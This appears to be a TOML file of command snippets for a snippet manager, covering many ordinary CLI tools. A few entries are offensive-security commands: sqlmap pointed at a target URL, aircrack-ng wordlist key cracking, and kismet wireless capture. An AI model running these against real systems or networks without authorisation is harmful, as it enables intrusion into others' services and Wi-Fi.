[[snippets]]
  description = "Listen on port 8080 on localhost"
  command = "uvicorn --host <localhost> --port <8080> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Turn on live reload"
  command = "uvicorn --reload <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Use 4 worker processes for handling requests"
  command = "uvicorn --workers <4> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Run app over HTTPS"
  command = "uvicorn --ssl-certfile <cert.pem> --ssl-keyfile <key.pem> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Replace the resource using the resource definition file"
  command = "kubectl replace -f <path/to/file.yml>"
  output = ""

[[snippets]]
  description = "Replace the resource using the input passed into `stdin`"
  command = "kubectl replace -f -"
  output = ""

[[snippets]]
  description = "Force replace, delete and then re-create the resource"
  command = "kubectl replace --force -f <path/to/file.yml>"
  output = ""

[[snippets]]
  description = "Generate and show an execution plan"
  command = "terragrunt plan"
  output = ""

[[snippets]]
  description = "Build or change infrastructure"
  command = "terragrunt apply"
  output = ""

[[snippets]]
  description = "Show current deployment (from state)"
  command = "terragrunt show"
  output = ""

[[snippets]]
  description = "Show module output values"
  command = "terragrunt output"
  output = ""

[[snippets]]
  description = "Destroy Terraform-managed infrastructure"
  command = "terragrunt destroy"
  output = ""

[[snippets]]
  description = "Build or change infrastructure from a tree of Terragrunt modules (stack)"
  command = "terragrunt run-all apply"
  output = ""

[[snippets]]
  description = "Add a new task to a board"
  command = "tb --task <task_description> @<board_name>"
  output = ""

[[snippets]]
  description = "Add a new note to a board"
  command = "tb --note <note_description> @<board_name>"
  output = ""

[[snippets]]
  description = "Edit item's priority"
  command = "tb --priority @<item_id> <priority>"
  output = ""

[[snippets]]
  description = "Check/uncheck item"
  command = "tb --check <item_id>"
  output = ""

[[snippets]]
  description = "Archive all checked items"
  command = "tb --clear"
  output = ""

[[snippets]]
  description = "Move item to a board"
  command = "tb --move @<item_id> <board_name>"
  output = ""

[[snippets]]
  description = "Change the password of the current user interactively"
  command = "passwd"
  output = ""

[[snippets]]
  description = "Change the password of a specific user"
  command = "passwd <username>"
  output = ""

[[snippets]]
  description = "Get the current status of the user"
  command = "passwd -S"
  output = ""

[[snippets]]
  description = "Make the password of the account blank (it will set the named account passwordless)"
  command = "passwd -d"
  output = ""

[[snippets]]
  description = "Set the currently focused window opacity to a specific percentage"
  command = "picom-trans --current --opacity <90>"
  output = ""

[[snippets]]
  description = "Set the opacity of a window with a specific name"
  command = "picom-trans --name <Firefox> --opacity <90>"
  output = ""

[[snippets]]
  description = "Set the opacity of a specific window selected via mouse cursor"
  command = "picom-trans --select --opacity <90>"
  output = ""

[[snippets]]
  description = "Toggle the opacity of a specific window"
  command = "picom-trans --name <Firefox> --toggle"
  output = ""

[[snippets]]
  description = "Tail all pods within a current namespace"
  command = "stern ."
  output = ""

[[snippets]]
  description = "Tail all pods with a specific status"
  command = "stern . --container-state <running|waiting|terminated>"
  output = ""

[[snippets]]
  description = "Tail all pods that matches a given regular expression"
  command = "stern <pod_query>"
  output = ""

[[snippets]]
  description = "Tail matched pods from all namespaces"
  command = "stern <pod_query> --all-namespaces"
  output = ""

[[snippets]]
  description = "Tail matched pods from 15 minutes ago"
  command = "stern <pod_query> --since <15m>"
  output = ""

[[snippets]]
  description = "Tail matched pods with a specific label"
  command = "stern <pod_query> --selector <release=canary>"
  output = ""

[[snippets]]
  description = "Compile a TypeScript file `foobar.ts` into a JavaScript file `foobar.js`"
  command = "tsc <foobar.ts>"
  output = ""

[[snippets]]
  description = "Compile a TypeScript file into JavaScript using a specific target syntax (default is `ES3`)"
  command = "tsc --target <ES5|ES2015|ES2016|ES2017|ES2018|ESNEXT> <foobar.ts>"
  output = ""

[[snippets]]
  description = "Compile a TypeScript file into a JavaScript file with a custom name"
  command = "tsc --outFile <output.js> <input.ts>"
  output = ""

[[snippets]]
  description = "Compile all `.ts` files of a TypeScript project defined in a `tsconfig.json` file"
  command = "tsc --build <tsconfig.json>"
  output = ""

[[snippets]]
  description = "Run the compiler using command-line options and arguments fetched from a text file"
  command = "tsc @<args.txt>"
  output = ""

[[snippets]]
  description = "Type-check multiple JavaScript files, and output only the errors"
  command = "tsc --allowJs --checkJs --noEmit <src/**/*.js>"
  output = ""

[[snippets]]
  description = "List all tags"
  command = "git tag"
  output = ""

[[snippets]]
  description = "Create a tag with the given name pointing to the current commit"
  command = "git tag <tag_name>"
  output = ""

[[snippets]]
  description = "Create a tag with the given name pointing to a given commit"
  command = "git tag <tag_name> <commit>"
  output = ""

[[snippets]]
  description = "Create an annotated tag with the given message"
  command = "git tag <tag_name> -m <tag_message>"
  output = ""

[[snippets]]
  description = "Delete the tag with the given name"
  command = "git tag -d <tag_name>"
  output = ""

[[snippets]]
  description = "Get updated tags from upstream"
  command = "git fetch --tags"
  output = ""

[[snippets]]
  description = "List all tags whose ancestors include a given commit"
  command = "git tag --contains <commit>"
  output = ""

[[snippets]]
  description = "Show all clipboards"
  command = "cb"
  output = ""

[[snippets]]
  description = "Copy a file to the clipboard"
  command = "cb copy <path/to/file>"
  output = ""

[[snippets]]
  description = "Copy some text to the clipboard"
  command = "cb copy ""<Some example text>"""
  output = ""

[[snippets]]
  description = "Copy piped data to the clipboard"
  command = "echo ""<Some example text>"" | cb"
  output = ""

[[snippets]]
  description = "Paste clipboard content"
  command = "cb paste"
  output = ""

[[snippets]]
  description = "Pipe out clipboard content"
  command = "cb | cat"
  output = ""

[[snippets]]
  description = "Show clipboard history"
  command = "cb history"
  output = ""

[[snippets]]
  description = "Show clipboard information"
  command = "cb info"
  output = ""

[[snippets]]
  description = "View available components for installation"
  command = "gcloud components list"
  output = ""

[[snippets]]
  description = "Install one or more components (installs any dependencies as well)"
  command = "gcloud components install <component_id1 component_id2 ...>"
  output = ""

[[snippets]]
  description = "Check the current version of Google Cloud CLI"
  command = "gcloud version"
  output = ""

[[snippets]]
  description = "Update Google Cloud CLI to the latest version"
  command = "gcloud components update"
  output = ""

[[snippets]]
  description = "Show all groups with their statuses and number of parallel jobs"
  command = "pueue group"
  output = ""

[[snippets]]
  description = "Add a custom group"
  command = "pueue group --add ""<group_name>"""
  output = ""

[[snippets]]
  description = "Remove a group and move its tasks to the default group"
  command = "pueue group --remove ""<group_name>"""
  output = ""

[[snippets]]
  description = "Edit the contents of the specified directories"
  command = "vidir <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Display each action taken by the program"
  command = "vidir --verbose <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Edit the contents of current directory"
  command = "vidir"
  output = ""

[[snippets]]
  description = "Use the specified text editor"
  command = "EDITOR=<vim> vidir <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Read a list of files to edit from `stdin`"
  command = "<command> | vidir -"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "ksh"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "ksh -c ""<echo 'ksh is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "ksh <path/to/script.ksh>"
  output = ""

[[snippets]]
  description = "Check a specific script for syntax errors without executing it"
  command = "ksh -n <path/to/script.ksh>"
  output = ""

[[snippets]]
  description = "Execute a specific script, printing each command in the script before executing it"
  command = "ksh -x <path/to/script.ksh>"
  output = ""

[[snippets]]
  description = "Connect to a Vault server and initialize a new encrypted data store"
  command = "vault init"
  output = ""

[[snippets]]
  description = "Unseal (unlock) the vault, by providing one of the key shares needed to access the encrypted data store"
  command = "vault unseal <key-share-x>"
  output = ""

[[snippets]]
  description = "Authenticate the CLI client against the Vault server, using an authentication token"
  command = "vault auth <authentication_token>"
  output = ""

[[snippets]]
  description = "Store a new secret in the vault, using the generic back-end called "secret""
  command = "vault write secret/<hello> value=<world>"
  output = ""

[[snippets]]
  description = "Read a value from the vault, using the generic back-end called "secret""
  command = "vault read secret/<hello>"
  output = ""

[[snippets]]
  description = "Read a specific field from the value"
  command = "vault read -field=<field_name> secret/<hello>"
  output = ""

[[snippets]]
  description = "Seal (lock) the Vault server, by removing the encryption key of the data store from memory"
  command = "vault seal"
  output = ""

[[snippets]]
  description = "Execute a Git subcommand"
  command = "git <subcommand>"
  output = ""

[[snippets]]
  description = "Execute a Git subcommand on a custom repository root path"
  command = "git -C <path/to/repo> <subcommand>"
  output = ""

[[snippets]]
  description = "Execute a Git subcommand with a given configuration set"
  command = "git -c '<config.key>=<value>' <subcommand>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "git --help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand (like `clone`, `add`, `push`, `log`, etc.)"
  command = "git help <subcommand>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "git --version"
  output = ""

[[snippets]]
  description = "Insert an entity into a table"
  command = "az storage entity insert --entity <space_separated_key_value_pairs> --table-name <table_name> --account-name <storage_account_name> --account-key <storage_account_key>"
  output = ""

[[snippets]]
  description = "Delete an existing entity from a table"
  command = "az storage entity delete --partition-key <partition_key> --row-key <row_key> --table-name <table_name> --account-name <storage_account_name> --account-key <storage_account_key>"
  output = ""

[[snippets]]
  description = "Update an existing entity by merging its properties"
  command = "az storage entity merge --entity <space_separated_key_value_pairs> --table-name <table_name> --account-name <storage_account_name> --account-key <storage_account_key>"
  output = ""

[[snippets]]
  description = "List entities which satisfy a query"
  command = "az storage entity query --filter <query_filter> --table-name <table_name> --account-name <storage_account_name> --account-key <storage_account_key>"
  output = ""

[[snippets]]
  description = "Get an entity from the specified table"
  command = "az storage entity show --partition-key <partition_key> --row-key <row_key> --table-name <table_name> --account-name <storage_account_name> --account-key <storage_account_key>"
  output = ""

[[snippets]]
  description = "Read JPEG image from a file and print in ASCII"
  command = "jp2a <path/to/image.jpeg>"
  output = ""

[[snippets]]
  description = "Read JPEG image from a URL and print in ASCII"
  command = "jp2a <www.example.com/image.jpeg>"
  output = ""

[[snippets]]
  description = "Colorize the ASCII output"
  command = "jp2a --colors <path/to/image.jpeg>"
  output = ""

[[snippets]]
  description = "Specify characters to be used for the ASCII output"
  command = "jp2a --chars='<..-ooxx@@>' <path/to/image.jpeg>"
  output = ""

[[snippets]]
  description = "Write the ASCII output into a file"
  command = "jp2a --output=<path/to/output_file.txt> <path/to/image.jpeg>"
  output = ""

[[snippets]]
  description = "Write the ASCII output in HTML file format, suitable for viewing in web browsers"
  command = "jp2a --html --output=<path/to/output_file.html> <path/to/image.jpeg>"
  output = ""

[[snippets]]
  description = "Run the project in the current directory"
  command = "dotnet run"
  output = ""

[[snippets]]
  description = "Run a specific project"
  command = "dotnet run --project <path/to/file.csproj>"
  output = ""

[[snippets]]
  description = "Run the project with specific arguments"
  command = "dotnet run -- <arg1=foo arg2=bar ...>"
  output = ""

[[snippets]]
  description = "Run the project using a target framework moniker"
  command = "dotnet run --framework <net7.0>"
  output = ""

[[snippets]]
  description = "Specify architecture and OS, available since .NET 6 (Don't use `--runtime` with these options)"
  command = "dotnet run --arch <x86|x64|arm|arm64> --os <win|win7|osx|linux|ios|android>"
  output = ""

[[snippets]]
  description = "Start Krita"
  command = "krita"
  output = ""

[[snippets]]
  description = "Open specific files"
  command = "krita <path/to/image1 path/to/image2 ...>"
  output = ""

[[snippets]]
  description = "Start without a splash screen"
  command = "krita --nosplash"
  output = ""

[[snippets]]
  description = "Start with a specific workspace"
  command = "krita --workspace <Animation>"
  output = ""

[[snippets]]
  description = "Start in fullscreen mode"
  command = "krita --fullscreen"
  output = ""

[[snippets]]
  description = "Show column names"
  command = "trawl -n"
  output = ""

[[snippets]]
  description = "Filter interface names using a case-insensitive regular expression"
  command = "trawl -f wi"
  output = ""

[[snippets]]
  description = "List available interfaces"
  command = "trawl -i"
  output = ""

[[snippets]]
  description = "Include the loopback interface"
  command = "trawl -l"
  output = ""

[[snippets]]
  description = "View the man page for a given command from the default toolchain"
  command = "rustup man <command>"
  output = ""

[[snippets]]
  description = "View the man page for a given command from the specified toolchain"
  command = "rustup man --toolchain <command>"
  output = ""

[[snippets]]
  description = "Clone a virtual machine and automatically generate a new name, storage path, and MAC address"
  command = "virt-clone --original <vm_name> --auto-clone"
  output = ""

[[snippets]]
  description = "Clone a virtual machine and specify the new name, storage path, and MAC address"
  command = "virt-clone --original <vm_name> --name <new_vm_name> --file <path/to/new_storage> --mac <ff:ff:ff:ff:ff:ff|RANDOM>"
  output = ""

[[snippets]]
  description = "Start an interactive shell with a transient in-memory database"
  command = "duckdb"
  output = ""

[[snippets]]
  description = "Start an interactive shell on a database file. If the file does not exist, a new database is created"
  command = "duckdb <path/to/dbfile>"
  output = ""

[[snippets]]
  description = "Directly query a CSV, JSON, or Parquet file"
  command = "duckdb -c ""<SELECT * FROM 'data_source.[csv|csv.gz|json|json.gz|parquet]'>"""
  output = ""

[[snippets]]
  description = "Run a SQL script"
  command = "duckdb -c "".read <path/to/script.sql>"""
  output = ""

[[snippets]]
  description = "Run query on database file and keep the interactive shell open"
  command = "duckdb <path/to/dbfile> -cmd ""<SELECT DISTINCT * FROM tbl>"""
  output = ""

[[snippets]]
  description = "Run SQL queries in file on database and keep the interactive shell open"
  command = "duckdb <path/to/dbfile> -init <path/to/script.sql>"
  output = ""

[[snippets]]
  description = "Read CSV from `stdin` and write CSV to `stdout`"
  command = "cat <path/to/source.csv> | duckdb -c ""<COPY (FROM read_csv_auto('/dev/stdin')) TO '/dev/stdout' WITH (FORMAT CSV, HEADER)>"""
  output = ""

[[snippets]]
  description = "Display help"
  command = "duckdb -help"
  output = ""

[[snippets]]
  description = "Login to Argo CD server"
  command = "argocd login --insecure --username <user> --password <password> <argocd_server:port>"
  output = ""

[[snippets]]
  description = "List applications"
  command = "argocd app list"
  output = ""

[[snippets]]
  description = "Start and manage all services in a directory as the current user"
  command = "runsvdir <path/to/services>"
  output = ""

[[snippets]]
  description = "Start and manage all services in a directory as root"
  command = "sudo runsvdir <path/to/services>"
  output = ""

[[snippets]]
  description = "Start services in separate sessions"
  command = "runsvdir -P <path/to/services>"
  output = ""

[[snippets]]
  description = "Add an API token to the local credential storage (located in `$CARGO_HOME/credentials.toml`)"
  command = "cargo login"
  output = ""

[[snippets]]
  description = "Use the specified registry (registry names can be defined in the configuration - the default is <https://crates.io>)"
  command = "cargo login --registry <name>"
  output = ""

[[snippets]]
  description = "Create disk image with a specific size (in gigabytes)"
  command = "qemu-img create <image_name.img> <gigabytes>G"
  output = ""

[[snippets]]
  description = "Show information about a disk image"
  command = "qemu-img info <image_name.img>"
  output = ""

[[snippets]]
  description = "Increase or decrease image size"
  command = "qemu-img resize <image_name.img> <gigabytes>G"
  output = ""

[[snippets]]
  description = "Dump the allocation state of every sector of the specified disk image"
  command = "qemu-img map <image_name.img>"
  output = ""

[[snippets]]
  description = "Convert a VMware .vmdk disk image to a KVM .qcow2 disk image"
  command = "qemu-img convert -f <vmdk> -O <qcow2> <path/to/file/foo.vmdk> <path/to/file/foo.qcow2>"
  output = ""

[[snippets]]
  description = "Fork and clone a GitHub repository by its URL"
  command = "git fork <https://github.com/tldr-pages/tldr>"
  output = ""

[[snippets]]
  description = "Fork and clone a GitHub repository by its slug"
  command = "git fork <tldr-pages/tldr>"
  output = ""

[[snippets]]
  description = "View all network traffic (use the arrow keys to switch interfaces)"
  command = "nload"
  output = ""

[[snippets]]
  description = "View network traffic on specific interfaces (use the arrow keys to switch interfaces)"
  command = "nload device <interface_one> <interface_two>"
  output = ""

[[snippets]]
  description = "Lookup errno description by name or code"
  command = "errno <name|code>"
  output = ""

[[snippets]]
  description = "List all errno names, codes, and descriptions"
  command = "errno --list"
  output = ""

[[snippets]]
  description = "Search for code whose description contains all of the given text"
  command = "errno --search <text>"
  output = ""

[[snippets]]
  description = "Search for code whose description contains all of the given text (all locales)"
  command = "errno --search-all-locales <text>"
  output = ""

[[snippets]]
  description = "Convert an XML document to PYX format"
  command = "xml pyx <path/to/input.xml|URI> > <path/to/output.pyx>"
  output = ""

[[snippets]]
  description = "Convert an XML document from `stdin` to PYX format"
  command = "cat <path/to/input.xml> | xml pyx > <path/to/output.pyx>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml pyx --help"
  output = ""

[[snippets]]
  description = "Post changes to Review Board"
  command = "rbt post <change_number>"
  output = ""

[[snippets]]
  description = "Display the diff that will be sent to Review Board"
  command = "rbt diff"
  output = ""

[[snippets]]
  description = "Land a change in a local branch or on a review request"
  command = "rbt land <branch_name>"
  output = ""

[[snippets]]
  description = "Patch your tree with a change on a review request"
  command = "rbt patch <review_request_id>"
  output = ""

[[snippets]]
  description = "Set up RBTool to talk to a repository"
  command = "rbt setup-repo"
  output = ""

[[snippets]]
  description = "Remove a file with sensitive data but leave the latest commit untouched"
  command = "bfg --delete-files <file_with_sensitive_data>"
  output = ""

[[snippets]]
  description = "Remove all text mentioned in the specified file wherever it can be found in the repository's history"
  command = "bfg --replace-text <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Compile a DVI document"
  command = "latex <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a DVI document, specifying an output directory"
  command = "latex -output-directory=<path/to/directory> <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a DVI document, exiting on each error"
  command = "latex -halt-on-error <source.tex>"
  output = ""

[[snippets]]
  description = "Identify hashes from `stdin` (through typing, copying and pasting, or piping the hash into the program)"
  command = "hashid"
  output = ""

[[snippets]]
  description = "Identify one or more hashes"
  command = "hashid <hash1 hash2 ...>"
  output = ""

[[snippets]]
  description = "Identify hashes on a file (one hash per line)"
  command = "hashid <path/to/hashes.txt>"
  output = ""

[[snippets]]
  description = "Show all possible hash types (including salted hashes)"
  command = "hashid --extended <hash>"
  output = ""

[[snippets]]
  description = "Show `hashcat`'s mode number and `john`'s format string of the hash types"
  command = "hashid --mode --john <hash>"
  output = ""

[[snippets]]
  description = "Save output to a file instead of printing to `stdout`"
  command = "hashid --outfile <path/to/output.txt> <hash>"
  output = ""

[[snippets]]
  description = "Create a new Rust project with a binary target"
  command = "cargo new <path/to/directory>"
  output = ""

[[snippets]]
  description = "Draw a histogram of a PNM image"
  command = "pnmhistmap <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Draw the histogram as dots instead of bars"
  command = "pnmhistmap -dots <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the range of intensity values to include"
  command = "pnmhistmap -lval <minval> -rval <maxval> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Initialize a new PlatformIO project"
  command = "pio project init"
  output = ""

[[snippets]]
  description = "Initialize a new PlatformIO project in a specific directory"
  command = "pio project init --project-dir <path/to/project_directory>"
  output = ""

[[snippets]]
  description = "Initialize a new PlatformIO project, specifying a board ID"
  command = "pio project init --board <ATmega328P|uno|...>"
  output = ""

[[snippets]]
  description = "Initialize a new PlatformIO based project, specifying one or more project options"
  command = "pio project init --project-option=""<option>=<value>"" --project-option=""<option>=<value>"""
  output = ""

[[snippets]]
  description = "Print the configuration of a project"
  command = "pio project config"
  output = ""

[[snippets]]
  description = "List your Support Tickets"
  command = "linode-cli tickets list"
  output = ""

[[snippets]]
  description = "Open a new Ticket"
  command = "linode-cli tickets create --summary ""<Summary or quick title for the Ticket>"" --description ""<Detailed description of the issue>"""
  output = ""

[[snippets]]
  description = "List replies to a Ticket"
  command = "linode-cli tickets replies <ticket_id>"
  output = ""

[[snippets]]
  description = "Reply to a specific Ticket"
  command = "linode-cli tickets reply <ticket_id> --description ""<The content of your reply>"""
  output = ""

[[snippets]]
  description = "Start the server, listening on port 11300"
  command = "beanstalkd"
  output = ""

[[snippets]]
  description = "Listen on a specific [p]ort and address"
  command = "beanstalkd -l <ip_address> -p <port_number>"
  output = ""

[[snippets]]
  description = "Persist work queues by saving them to disk"
  command = "beanstalkd -b <path/to/persistence_directory>"
  output = ""

[[snippets]]
  description = "Sync to the persistence directory every 500 milliseconds"
  command = "beanstalkd -b <path/to/persistence_directory> -f <500>"
  output = ""

[[snippets]]
  description = "List all Docker images"
  command = "docker images"
  output = ""

[[snippets]]
  description = "List all Docker images including intermediates"
  command = "docker images --all"
  output = ""

[[snippets]]
  description = "List the output in quiet mode (only numeric IDs)"
  command = "docker images --quiet"
  output = ""

[[snippets]]
  description = "List all Docker images not used by any container"
  command = "docker images --filter dangling=true"
  output = ""

[[snippets]]
  description = "List images that contain a substring in their name"
  command = "docker images ""<*name*>"""
  output = ""

[[snippets]]
  description = "Sort images by size"
  command = "docker images --format ""<.ID>\t<.Size>\t<.Repository>:<.Tag>"" | sort -k 2 -h"
  output = ""

[[snippets]]
  description = "Interactively create a pull request"
  command = "gh pr create"
  output = ""

[[snippets]]
  description = "Create a pull request, determining the title and description from the commit messages of the current branch"
  command = "gh pr create --fill"
  output = ""

[[snippets]]
  description = "Create a draft pull request"
  command = "gh pr create --draft"
  output = ""

[[snippets]]
  description = "Create a pull request specifying the base branch, title, and description"
  command = "gh pr create --base <base_branch> --title ""<title>"" --body ""<body>"""
  output = ""

[[snippets]]
  description = "Start opening a pull request in the default web browser"
  command = "gh pr create --web"
  output = ""

[[snippets]]
  description = "Show detailed configuration of all mounted ZFS zpools"
  command = "zdb"
  output = ""

[[snippets]]
  description = "Show detailed configuration for a specific ZFS pool"
  command = "zdb -C <poolname>"
  output = ""

[[snippets]]
  description = "Show statistics about number, size and deduplication of blocks"
  command = "zdb -b <poolname>"
  output = ""

[[snippets]]
  description = "Make a desktop app for a website"
  command = "nativefier <url>"
  output = ""

[[snippets]]
  description = "Create a desktop app with a custom name"
  command = "nativefier --name <name> <url>"
  output = ""

[[snippets]]
  description = "Use a custom icon, should be a PNG"
  command = "nativefier --icon <path/to/icon.png> <url>"
  output = ""

[[snippets]]
  description = "Draw a CIE color chart using the REC709 color system as a PPM image"
  command = "ppmcie > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Specify the color system to be used"
  command = "ppmcie -<cie|ebu|hdtv|ntsc|smpte> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Specify the location of the individual illuminants"
  command = "ppmcie -<red|green|blue> <xpos ypos> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Do not dim the area outside the Maxwell triangle"
  command = "ppmcie -full > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "View documentation for managing `cron` entries"
  command = "tldr crontab"
  output = ""

[[snippets]]
  description = "Optimize a PNG"
  command = "zopflipng <input.png> <output.png>"
  output = ""

[[snippets]]
  description = "Optimize several PNGs and save with given prefix"
  command = "zopflipng --prefix=<prefix> <image1.png> <image2.png> <image3.png>"
  output = ""

[[snippets]]
  description = "Compile and install the current package"
  command = "go install"
  output = ""

[[snippets]]
  description = "Compile and install a specific local package"
  command = "go install <path/to/package>"
  output = ""

[[snippets]]
  description = "Install the latest version of a program, ignoring `go.mod` in the current directory"
  command = "go install <golang.org/x/tools/gopls>@<latest>"
  output = ""

[[snippets]]
  description = "Install a program at the version selected by `go.mod` in the current directory"
  command = "go install <golang.org/x/tools/gopls>"
  output = ""

[[snippets]]
  description = "Run sqlmap against a single target URL"
  command = "python sqlmap.py -u ""<http://www.target.com/vuln.php?id=1>"""
  output = ""

[[snippets]]
  description = "Send data in a POST request (`--data` implies POST request)"
  command = "python sqlmap.py -u ""<http://www.target.com/vuln.php>"" --data=""<id=1>"""
  output = ""

[[snippets]]
  description = "Change the parameter delimiter (& is the default)"
  command = "python sqlmap.py -u ""<http://www.target.com/vuln.php>"" --data=""<query=foobar;id=1>"" --param-del=""<;>"""
  output = ""

[[snippets]]
  description = "Select a random `User-Agent` from `./txt/user-agents.txt` and use it"
  command = "python sqlmap.py -u ""<http://www.target.com/vuln.php>"" --random-agent"
  output = ""

[[snippets]]
  description = "Provide user credentials for HTTP protocol authentication"
  command = "python sqlmap.py -u ""<http://www.target.com/vuln.php>"" --auth-type <Basic> --auth-cred ""<testuser:testpass>"""
  output = ""

[[snippets]]
  description = "Print lines of code in the current directory"
  command = "scc"
  output = ""

[[snippets]]
  description = "Print lines of code in the target directory"
  command = "scc <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display output for every file"
  command = "scc --by-file"
  output = ""

[[snippets]]
  description = "Display output using a specific output format (defaults to `tabular`)"
  command = "scc --format <tabular|wide|json|csv|cloc-yaml|html|html-table>"
  output = ""

[[snippets]]
  description = "Only count files with specific file extensions"
  command = "scc --include-ext <go,java,js>"
  output = ""

[[snippets]]
  description = "Exclude directories from being counted"
  command = "scc --exclude-dir <.git,.hg>"
  output = ""

[[snippets]]
  description = "Display output and sort by column (defaults to by files)"
  command = "scc --sort <files|name|lines|blanks|code|comments|complexity>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "scc -h"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a PS file"
  command = "pnmtops <path/to/file.pnm> > <path/to/file.ps>"
  output = ""

[[snippets]]
  description = "Specify the dimensions of the output image in inches"
  command = "pnmtops -imagewidth <imagewidth> -imageheight <imageheight> <path/to/file.pnm> > <path/to/file.ps>"
  output = ""

[[snippets]]
  description = "Specify the dimensions of the page the output image resides on in inches"
  command = "pnmtops -width <width> -height <height> <path/to/file.pnm> > <path/to/file.ps>"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a WBMP file"
  command = "pbmtowbmp <path/to/input_file.pbm> > <path/to/output_file.wbmp>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell) using a specific Scala and JVM version"
  command = "scala-cli --scala <3.1.0> --jvm <temurin:17>"
  output = ""

[[snippets]]
  description = "Compile and run a Scala script"
  command = "scala-cli run <path/to/script.scala>"
  output = ""

[[snippets]]
  description = "Compile and test a Scala script"
  command = "scala-cli test <path/to/script.scala>"
  output = ""

[[snippets]]
  description = "Format a Scala script, updating the file in-place"
  command = "scala-cli fmt <path/to/script.scala>"
  output = ""

[[snippets]]
  description = "Generate files for IDE (VSCode and IntelliJ) support"
  command = "scala-cli setup-ide <path/to/script.scala>"
  output = ""

[[snippets]]
  description = "Print the mcfly integration code for the specified shell"
  command = "mcfly init <bash|fish|zsh>"
  output = ""

[[snippets]]
  description = "Search the history for a command, with 20 results"
  command = "mcfly search --results <20> ""<search_terms>"""
  output = ""

[[snippets]]
  description = "Add a new command to the history"
  command = "mcfly add ""<command>"""
  output = ""

[[snippets]]
  description = "Record that a directory has moved and transfer the historical records from the old path to the new one"
  command = "mcfly move ""<path/to/old_directory>"" ""<path/to/new_directory>"""
  output = ""

[[snippets]]
  description = "Train the suggestion engine (developer tool)"
  command = "mcfly train"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "mcfly help <subcommand>"
  output = ""

[[snippets]]
  description = "Create a serverless project"
  command = "serverless create"
  output = ""

[[snippets]]
  description = "Create a serverless project from a template"
  command = "serverless create --template <template_name>"
  output = ""

[[snippets]]
  description = "Deploy to a cloud provider"
  command = "serverless deploy"
  output = ""

[[snippets]]
  description = "Display information about a serverless project"
  command = "serverless info"
  output = ""

[[snippets]]
  description = "Invoke a deployed function"
  command = "serverless invoke -f <function_name>"
  output = ""

[[snippets]]
  description = "Follow the logs for a project"
  command = "serverless logs -t"
  output = ""

[[snippets]]
  description = "Generate a convolution kernel"
  command = "pgmkernel <width> <height> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Generate a quadratic convolution kernel"
  command = "pgmkernel <size> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Specify the weight of the center in the generated kernel"
  command = "pgmkernel -weight <value> <width> <height> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Capture packets from a specific wireless interface"
  command = "sudo kismet -c <wlan0>"
  output = ""

[[snippets]]
  description = "Monitor multiple channels on a wireless interface"
  command = "sudo kismet -c <wlan0,wlan1> -m"
  output = ""

[[snippets]]
  description = "Capture packets and save them to a specific directory"
  command = "sudo kismet -c <wlan0> -d <path/to/output>"
  output = ""

[[snippets]]
  description = "Start Kismet with a specific configuration file"
  command = "sudo kismet -c <wlan0> -f <path/to/config.conf>"
  output = ""

[[snippets]]
  description = "Monitor and log data to an SQLite database"
  command = "sudo kismet -c <wlan0> --log-to-db"
  output = ""

[[snippets]]
  description = "Monitor using a specific data source"
  command = "sudo kismet -c <wlan0> --data-source=<rtl433>"
  output = ""

[[snippets]]
  description = "Enable alerts for specific events"
  command = "sudo kismet -c <wlan0> --enable-alert=<new_ap>"
  output = ""

[[snippets]]
  description = "Display detailed information about a specific AP's packets"
  command = "sudo kismet -c <wlan0> --info <BSSID>"
  output = ""

[[snippets]]
  description = "Crack key from capture file using [w]ordlist"
  command = "aircrack-ng -w <path/to/wordlist.txt> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Crack key from capture file using [w]ordlist and the access point's [e]ssid"
  command = "aircrack-ng -w <path/to/wordlist.txt> -e <essid> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Crack key from capture file using [w]ordlist and the access point's MAC address"
  command = "aircrack-ng -w <path/to/wordlist.txt> --bssid <mac> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Compress a file into a new file with the `.lzo` suffix"
  command = "lzop <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress a file"
  command = "lzop -d <path/to/file.lzo>"
  output = ""

[[snippets]]
  description = "Compress a file, while specifying the compression level. 0 = Worst, 9 = Best (Default level is 3)"
  command = "lzop -<level> <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove file from repository index and filesystem"
  command = "git rm <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove directory"
  command = "git rm -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove file from repository index but keep it untouched locally"
  command = "git rm --cached <path/to/file>"
  output = ""

[[snippets]]
